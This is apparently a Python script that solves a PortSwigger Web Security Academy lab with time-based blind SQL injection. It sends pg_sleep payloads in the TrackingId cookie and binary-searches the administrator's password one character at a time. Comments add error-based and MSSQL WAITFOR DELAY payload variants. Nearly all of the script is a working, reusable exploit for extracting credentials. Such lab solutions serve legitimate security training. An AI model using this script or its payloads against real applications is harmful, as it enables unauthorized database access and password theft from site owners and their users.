import requests
import time

import time

import requests

lab_url = "https://0a1a00cb048731bb82148e6b00bb00fd.web-security-academy.net/"

ASCII_MIN = 32
ASCII_MAX = 126
MAX_POSITIONS = 64
MAX_RETRIES = 3


# SELECT * FROM tracking WHERE id = '' OR (SELECT * from users where username = administrator) = '
## xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
## '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--



def oracle(condition, retries=MAX_RETRIES):
    """Return True if the SQL condition is true, based on the response oracle."""
    payload = (
        f"' || (SELECT CASE WHEN ((select 1 from users where username='administrator' and {condition}) = 1) THEN pg_sleep(2) ELSE pg_sleep(0) END) --"
    )
    print(payload)
    for attempt in range(1, retries + 1):
        start = time.time()
        try:
            response = requests.get(
                lab_url, cookies={"TrackingId": payload}, timeout=10
            )
            elapsed = time.time() - start
            return elapsed >= 2
        except requests.RequestException as exc:
            if attempt == retries:
                raise
            print(f"Request failed ({exc}); retrying ({attempt}/{retries})...")
            time.sleep(attempt)

    return False


def find_char(position):
    """Binary search the ASCII value at `position`.

    Returns None when the position is past the end of the password.
    """
    expr = f"ASCII(SUBSTRING(password, {position}, 1))"

    # Past the end of the password, SUBSTRING returns '' and ASCII('') is NULL,
    # so this comparison is never true. That means the password ended.
    if not oracle(f"{expr} >= {ASCII_MIN}"):
        return None

    lo, hi = ASCII_MIN, ASCII_MAX
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"{expr} > {mid}"):
            lo = mid + 1
        else:
            hi = mid

    # Guard against a character outside the searchable range.
    if not oracle(f"{expr} = {lo}"):
        return None

    return chr(lo)


def main():
    result = ""

    for position in range(1, MAX_POSITIONS + 1):
        char = find_char(position)
        if char is None:
            print(f"Password ended at position {position}. Stopping.")
            break

        result += char
        print(f"Position {position}: {char}")

    print("Result:", result)


if __name__ == "__main__":
    main()


# xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


